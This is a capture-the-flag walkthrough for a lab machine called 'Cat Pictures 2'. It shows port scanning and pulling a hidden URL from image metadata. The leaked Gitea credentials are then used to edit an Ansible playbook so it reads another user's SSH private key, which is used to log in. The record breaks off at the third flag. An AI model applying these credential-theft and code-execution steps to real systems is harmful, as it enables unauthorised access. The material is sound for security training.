# Cat Pictures 2

## Port Scan
```
 kewl@h4x0r > ~/Desktop/leet/l > rustscan -a 10.10.158.237 -t 5000 -- -sV
...
...
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.4.6 (Ubuntu)
222/tcp  open  ssh     syn-ack OpenSSH 9.0 (protocol 2.0)
1337/tcp open  waste?  syn-ack
3000/tcp open  ppp?    syn-ack
8080/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.6.9)
...
...
```

Lychee is hosted on 10.10.158.237:80 , Gitea on port 3000 and OliveTin on port 1337

## Flag 1

head over to 10.10.158.237:80 and check the images. Description of the first images says "note to self: strip metadata". Download the imnage and run exfitool on it.

```
 kewl@h4x0r > ~/Desktop/leet/l > exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg | grep Title
Title                           : :8080/[REDACTED].txt
```

Now head over to 10.10.158.237:8080/[REDACTED].txt

```
 kewl@h4x0r > ~/Desktop/leet/l > curl http://10.10.158.237:8080/[REDACTED].txt
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: [REDACTED]

ansible runner (olivetin): port 1337
```

Lets use the password to log into samarium's Gitea account.
The user owns a private repo with the name "ansible"

![](1.png)

## Flag 2
Now lets check ansible runner (olivetin) at port 1337.
Click on "Run Ansible Playbook" and wait for it to finish and check the logs<br>
![](2.png)

There is user named "bismuth". lets check if this user has a ssh key.<br>
Remember that we can edit playbook.yaml in ansible repo to execute the commands we want.
change "whoami" to "cat /home/bismuth/.ssh/id_rsa"
```yaml
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: cat /home/bismuth/.ssh/id_rsa
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```
Head over to OliveTin and run ansible playbook.
![](3.png)<br>
Use the private key to log into bimuth's account using ssh
```bash
chmod 600 bismuth_key
ssh -i bismuth_key bismuth@10.10.158.237
```
```bash
bismuth@catpictures-ii:~$ ls
flag2.txt
bismuth@catpictures-ii:~$ cat flag2.txt
[REDACTED]
```

## Flag 3
